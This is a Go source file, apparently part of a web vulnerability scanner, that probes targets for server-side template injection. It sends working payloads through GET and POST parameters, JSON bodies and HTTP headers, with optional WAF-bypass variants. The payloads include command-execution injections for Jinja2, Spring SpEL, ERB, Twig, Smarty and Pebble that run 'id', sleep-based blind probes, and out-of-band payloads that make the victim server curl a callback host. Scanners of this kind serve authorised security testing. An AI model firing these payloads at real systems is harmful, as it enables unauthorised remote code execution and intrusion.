package main

import (
	"context"
	"fmt"
	"net/url"
	"regexp"
	"strings"
	"time"
)

type sstiProbe struct {
	Payload  string
	Pattern  *regexp.Regexp
	Engine   string
	Severity string
}

func sstiProbes() []sstiProbe {
	return []sstiProbe{
		// Math-based (49 from 7*7) — ordered from most specific to least
		{`{{7*7}}`, regexp.MustCompile(`\b49\b`), "Jinja2/Twig", "HIGH"},
		{`{{7*'7'}}`, regexp.MustCompile(`7777777`), "Jinja2", "HIGH"},
		{`{{'7'*7}}`, regexp.MustCompile(`7777777`), "Jinja2-string", "HIGH"},
		{`${7*7}`, regexp.MustCompile(`\b49\b`), "Freemarker/EL/Mako", "HIGH"},
		{`#{7*7}`, regexp.MustCompile(`\b49\b`), "Freemarker/Ruby", "HIGH"},
		{`{7*7}`, regexp.MustCompile(`\b49\b`), "Smarty", "HIGH"},
		{`<%= 7*7 %>`, regexp.MustCompile(`\b49\b`), "ERB (Ruby)", "HIGH"},
		{`#set($x=7*7)${x}`, regexp.MustCompile(`\b49\b`), "Velocity", "HIGH"},
		{`%{7*7}`, regexp.MustCompile(`\b49\b`), "OGNL/Struts", "HIGH"},
		{`[[${7*7}]]`, regexp.MustCompile(`\b49\b`), "Thymeleaf", "HIGH"},
		{`[(7*7)]`, regexp.MustCompile(`\b49\b`), "Thymeleaf-expr", "HIGH"},
		{`*{7*7}`, regexp.MustCompile(`\b49\b`), "Thymeleaf-sel", "HIGH"},

		// RCE probes (Linux id command)
		{`{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}`,
			regexp.MustCompile(`uid=\d+`), "Jinja2 RCE", "CRITICAL"},
		{`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`,
			regexp.MustCompile(`uid=\d+`), "Jinja2 RCE (globals)", "CRITICAL"},
		{`<%= ` + "`id`" + ` %>`,
			regexp.MustCompile(`uid=\d+`), "ERB RCE", "CRITICAL"},
		{`#{"id".system}`,
			regexp.MustCompile(`uid=\d+`), "Ruby/Slim RCE", "CRITICAL"},
		{`${T(java.lang.Runtime).getRuntime().exec('id')}`,
			regexp.MustCompile(`uid=\d+`), "Spring SPEL RCE", "CRITICAL"},
		{`{% import os %}{{os.popen('id').read()}}`,
			regexp.MustCompile(`uid=\d+`), "Tornado RCE", "CRITICAL"},
		{`{php}echo shell_exec('id');{/php}`,
			regexp.MustCompile(`uid=\d+`), "Smarty PHP RCE", "CRITICAL"},
		// Twig RCE
		{`{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}`,
			regexp.MustCompile(`uid=\d+`), "Twig RCE", "CRITICAL"},
		// Pebble
		{`{%import "java.lang.Runtime"%}{{Runtime.exec("id")}}`,
			regexp.MustCompile(`uid=\d+`), "Pebble RCE", "CRITICAL"},
	}
}

type sstiBlind struct {
	Payload string
	Engine  string
	DelayMs int64
}

func sstiBlindProbes() []sstiBlind {
	return []sstiBlind{
		{`{{range.constructor("return global.process.mainModule.require('child_process').execSync('sleep 5').toString()")()}}`, "Node/Handlebars", 5000},
		{`{{7*'7'}}{% for i in range(9999999) %}{% endfor %}`, "Jinja2 loop", 4000},
		{`${T(java.lang.Thread).sleep(5000)}`, "Spring SPEL", 5000},
		{`#set($x="")#foreach($i in [1..9999999])$x=$x.concat("x")#end`, "Velocity", 4000},
		{`{% import time %}${time.sleep(5)}`, "Python/Mako", 5000},
	}
}

func (s *Scanner) scanSSTI(ctx context.Context, target string) {
	baseline := s.requester.Baseline(ctx, target)
	params := extractParams(target)
	if len(params) == 0 {
		params = []string{"name", "q", "search", "query", "template", "view", "page",
			"lang", "msg", "data", "input", "text", "content", "title", "subject",
			"body", "message", "description", "label", "value", "field"}
	}

	probes := sstiProbes()
	blinds := sstiBlindProbes()

	for _, param := range params {
		// GET params
		s.sstiTestParam(ctx, target, param, "GET", probes, blinds, baseline)
		// POST form
		s.sstiTestPOSTForm(ctx, target, param, probes, blinds, baseline)
		// POST JSON
		s.sstiTestPOSTJSON(ctx, target, param, probes, blinds, baseline)
	}

	// Header injection
	s.sstiHeaders(ctx, target, baseline)

	// OOB
	if s.cfg.OOBHost != "" {
		s.sstiOOB(ctx, target, params)
	}
}

func (s *Scanner) sstiTestParam(ctx context.Context, target, param, method string, probes []sstiProbe, blinds []sstiBlind, baseline *RespData) {
	for _, p := range probes {
		payloads := []string{p.Payload}
		if s.cfg.WAFBypass {
			payloads = append(payloads, WAFVariants(p.Payload)...)
		}

		for _, payload := range payloads {
			parsed, err := url.Parse(target)
			if err != nil {
				continue
			}
			q := parsed.Query()
			q.Set(param, payload)
			parsed.RawQuery = q.Encode()

			resp, err := s.requester.Do(ReqOpts{Method: "GET", URL: parsed.String(), Context: ctx})
			if err != nil {
				continue
			}

			if p.Pattern != nil && s.requester.IsNewContent(baseline, resp, p.Pattern) {
				s.store.Add(Finding{
					URL:      target,
					Vuln:     "SSTI",
					Type:     fmt.Sprintf("In-band GET (%s)", p.Engine),
					Payload:  fmt.Sprintf("%s=%s", param, payload),
					Evidence: fmt.Sprintf("Pattern '%s' in response (not in baseline)", p.Pattern.String()),
					Severity: p.Severity,
					Response: extractSnippet(resp.Body, p.Pattern),
				})
				break
			}
		}
	}

	// Blind time-based
	for _, b := range blinds {
		parsed, _ := url.Parse(target)
		q := parsed.Query()
		q.Set(param, b.Payload)
		parsed.RawQuery = q.Encode()

		start := nowMs()
		s.requester.Do(ReqOpts{Method: "GET", URL: parsed.String(), Context: ctx})
		elapsed := nowMs() - start

		if elapsed >= b.DelayMs {
			s.store.Add(Finding{
				URL:      target,
				Vuln:     "SSTI",
				Type:     fmt.Sprintf("Blind Time-based GET (%s)", b.Engine),
				Payload:  fmt.Sprintf("%s=%s", param, b.Payload),
				Evidence: fmt.Sprintf("Delay: %dms (expected >=%dms)", elapsed, b.DelayMs),
				Severity: "HIGH",
			})
		}
	}
}

func (s *Scanner) sstiTestPOSTForm(ctx context.Context, target, param string, probes []sstiProbe, blinds []sstiBlind, baseline *RespData) {
	for _, p := range probes {
		body := fmt.Sprintf("%s=%s", param, url.QueryEscape(p.Payload))
		resp, err := s.requester.Do(ReqOpts{
			Method: "POST", URL: target,
			ContentType: "application/x-www-form-urlencoded",
			Body:        body, Context: ctx,
		})
		if err != nil {
			continue
		}
		if p.Pattern != nil && s.requester.IsNewContent(baseline, resp, p.Pattern) {
			s.store.Add(Finding{
				URL:      target,
				Vuln:     "SSTI",
				Type:     fmt.Sprintf("In-band POST Form (%s)", p.Engine),
				Payload:  fmt.Sprintf("POST %s=%s", param, p.Payload),
				Evidence: fmt.Sprintf("Expression evaluated in form-urlencoded POST"),
				Severity: p.Severity,
				Response: extractSnippet(resp.Body, p.Pattern),
			})
		}
	}

	for _, b := range blinds {
		body := fmt.Sprintf("%s=%s", param, url.QueryEscape(b.Payload))
		start := nowMs()
		s.requester.Do(ReqOpts{
			Method: "POST", URL: target,
			ContentType: "application/x-www-form-urlencoded",
			Body:        body, Context: ctx,
		})
		if elapsed := nowMs() - start; elapsed >= b.DelayMs {
			s.store.Add(Finding{
				URL:      target,
				Vuln:     "SSTI",
				Type:     fmt.Sprintf("Blind Time-based POST Form (%s)", b.Engine),
				Payload:  fmt.Sprintf("POST %s=<sleep_payload>", param),
				Evidence: fmt.Sprintf("Delay: %dms", elapsed),
				Severity: "HIGH",
			})
		}
	}
}

func (s *Scanner) sstiTestPOSTJSON(ctx context.Context, target, param string, probes []sstiProbe, blinds []sstiBlind, baseline *RespData) {
	for _, p := range probes {
		escaped := strings.ReplaceAll(p.Payload, `"`, `\"`)
		body := fmt.Sprintf(`{"%s":"%s"}`, param, escaped)
		resp, err := s.requester.Do(ReqOpts{
			Method: "POST", URL: target,
			ContentType: "application/json",
			Body:        body, Context: ctx,
		})
		if err != nil {
			continue
		}
		if p.Pattern != nil && s.requester.IsNewContent(baseline, resp, p.Pattern) {
			s.store.Add(Finding{
				URL:      target,
				Vuln:     "SSTI",
				Type:     fmt.Sprintf("In-band JSON POST (%s)", p.Engine),
				Payload:  fmt.Sprintf(`JSON: {"%s":"%s"}`, param, p.Payload),
				Evidence: "Template expression evaluated via JSON body",
				Severity: p.Severity,
			})
		}
	}

	for _, b := range blinds {
		escaped := strings.ReplaceAll(b.Payload, `"`, `\"`)
		body := fmt.Sprintf(`{"%s":"%s"}`, param, escaped)
		start := nowMs()
		s.requester.Do(ReqOpts{
			Method: "POST", URL: target,
			ContentType: "application/json",
			Body:        body, Context: ctx,
		})
		if elapsed := nowMs() - start; elapsed >= b.DelayMs {
			s.store.Add(Finding{
				URL:      target,
				Vuln:     "SSTI",
				Type:     fmt.Sprintf("Blind Time-based JSON (%s)", b.Engine),
				Payload:  fmt.Sprintf(`JSON: {"%s":"<sleep>"}`, param),
				Evidence: fmt.Sprintf("Delay: %dms", elapsed),
				Severity: "HIGH",
			})
		}
	}
}

func (s *Scanner) sstiHeaders(ctx context.Context, target string, baseline *RespData) {
	headers := map[string][]string{
		"User-Agent":      {`{{7*7}}`, `${7*7}`, `#{7*7}`, `<%= 7*7 %>`},
		"Referer":         {`{{7*7}}`, `${7*7}`},
		"X-Forwarded-For": {`{{7*7}}`, `#{7*7}`},
		"Accept-Language": {`{{7*7}}`, `${7*7}`},
		"X-Custom-Header": {`{{7*7}}`, `${7*7}`},
	}

	pattern49 := regexp.MustCompile(`\b49\b`)

	for header, payloads := range headers {
		for _, payload := range payloads {
			resp, err := s.requester.Do(ReqOpts{
				Method: "GET", URL: target,
				Headers: map[string]string{header: payload},
				Context: ctx,
			})
			if err != nil {
				continue
			}
			if s.requester.IsNewContent(baseline, resp, pattern49) {
				s.store.Add(Finding{
					URL:      target,
					Vuln:     "SSTI",
					Type:     fmt.Sprintf("Header Injection (%s)", header),
					Payload:  fmt.Sprintf("%s: %s", header, payload),
					Evidence: "Expression '49' appeared in response (not in baseline)",
					Severity: "HIGH",
				})
				break
			}
		}
	}
}

func (s *Scanner) sstiOOB(ctx context.Context, target string, params []string) {
	for _, param := range params[:min(3, len(params))] {
		oobID := randomID("ssti")
		oobPayloads := []string{
			fmt.Sprintf(`{{config.__class__.__init__.__globals__['os'].popen('curl http://%s/oob/%s').read()}}`, s.cfg.OOBHost, oobID),
			fmt.Sprintf(`${T(java.lang.Runtime).getRuntime().exec(new String[]{"curl","http://%s/oob/%s"})}`, s.cfg.OOBHost, oobID),
			fmt.Sprintf("<%%=`curl http://%s/oob/%s`%%>", s.cfg.OOBHost, oobID),
		}

		for _, payload := range oobPayloads {
			parsed, _ := url.Parse(target)
			q := parsed.Query()
			q.Set(param, payload)
			parsed.RawQuery = q.Encode()
			s.requester.Do(ReqOpts{Method: "GET", URL: parsed.String(), Context: ctx})

			body := fmt.Sprintf("%s=%s", param, url.QueryEscape(payload))
			s.requester.Do(ReqOpts{
				Method: "POST", URL: target,
				ContentType: "application/x-www-form-urlencoded",
				Body:        body, Context: ctx,
			})
		}

		if hit, info := s.oob.Check(oobID, 4*time.Second); hit {
			s.store.Add(Finding{
				URL:      target,
				Vuln:     "SSTI",
				Type:     "OOB RCE via SSTI",
				Payload:  fmt.Sprintf("%s=<rce_curl_oob>", param),
				Evidence: fmt.Sprintf("OOB callback from %s — confirmed RCE", info.RemoteAddr),
				Severity: "CRITICAL",
			})
			break
		}
	}
}

func extractParams(rawURL string) []string {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return nil
	}
	var params []string
	for k := range parsed.Query() {
		params = append(params, k)
	}
	return params
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
